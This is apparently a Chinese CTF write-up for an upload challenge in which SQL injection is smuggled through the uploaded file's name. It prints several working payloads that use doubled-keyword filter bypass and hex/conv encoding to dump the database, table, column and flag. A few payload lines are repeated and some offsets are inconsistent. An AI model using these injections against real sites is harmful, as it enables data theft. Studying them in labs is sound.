## 题目描述

![image-20210117193823007](\image-1\image-20210117193823007.png)

首先是一个注册界面，填入邮箱密码注册之后，点击login，然后进入到上图的界面，可以选择一个文件进行上传，但是上传文件的后缀名必须为.jpg文件名后缀。

## 御剑扫描后台

使用御剑进行扫描，发现存在includes文件夹：

![image-20210117195054337](\image-1\image-20210117195054337.png)

好像并没有什么用处……

## 使用burp suite拦截包



![image-20210117201930639](\image-1\image-20210117201930639.png)

![image-20210117202133639](\image-1\image-20210117202133639.png)

- 网上的write up查了过滤的规则，我没有弄清楚他是怎么查的，根据intruder里面的功能，对指定的payload查询过滤规则，本题要对filename那里的过滤规则进行查询，因为我们的目标是通过这个网站上传文件之后的回显功能，再根据sql注入，通过回显来查询到我们所需要的信息，比如数据库，表名之类的信息。

- 网上说这个服务器中对filename进行了双写绕过（然后我硬是没有搞明白这一步是怎么弄的，这里还没有搞明白怎么设置过滤）

## sql注入

- 通过回显功能，我们可以将文件名改成

```mysql
a' +(selselectect conv(substr(hex(database()),1,12),16,10))+ '.jpg
```

![image-20210117220936612](\image-1\image-20210117220936612.png)



- 本来是`select database()`便可以得到数据库的名称，但是在这道题中，存在两个问题：

1. 首先，超出一定的长度会出现科学计数法：

![image-20210117221520355](\image-1\image-20210117221520355.png)

所以需要对得到的数据库名进行substr操作得到子字符串。

2. 其次，在使用十六进制的时候，会把出现字母（abcdef）的内容给截掉，所以我们要使用conv函数将十六进制的转化成十进制。

最终通过两个payload得到数据库名：

（在这里有个疑问就是为什么要把select打成selselectect呢？）

```mysql
a' +(selselectect conv(substr(hex(database()),1,12),16,10))+ '.jpg
a' +(selselectect conv(substr(hex(database()),12,15),16,10))+ '.jpg
```

得到的回显结果如下图所示：

![image-20210117221737631](\image-1\image-20210117221737631.png)

- 得到的是十进制的结果，我们要先把这些十进制的结果转化成十六进制，再将十六进制转化成字符串文本内容，得到的就是数据库的名称。

![image-20210117222850309](\image-1\image-20210117222850309.png)

`7765625f7570`

![image-20210117222918722](\image-1\image-20210117222918722.png)

`6c6f6164`

![image-20210117223004406](\image-1\image-20210117223004406.png)

所以数据库的名称为`web_upload`.

- 接下来依次对表名、列名、字段名进行相同的操作得到flag：

**查询表名**

```mysql
a'+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = 'web_upload' limit  1,1)),1,12),16,10))+'.jpg

a'+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = 'web_upload' limit  1,1)),1,12),16,10))+'.jpg

 a'+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA =  'web_upload' limit 1,1)),25,12),16,10))+'.jpg
```

按照上述转换操作得到的结果是：`hello_flag_is_here	`

**查询列名**

```mysql
s'+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = ‘hello_flag_is_here’  limit 0,1)),1,12),16,10))+'.jpg

s'+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = ‘hello_flag_is_here’  limit 0,1)),13,12),16,10))+'.jpg
```

得到的结果是`i_am_flag`

**查询字段内容**

```mysql
s'+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+'.jpg

s'+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+'.jpg

s'+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+'.jpg
```

得到的结果是`!!_@m_Th.e_F!lag`，所以flag就是这个。

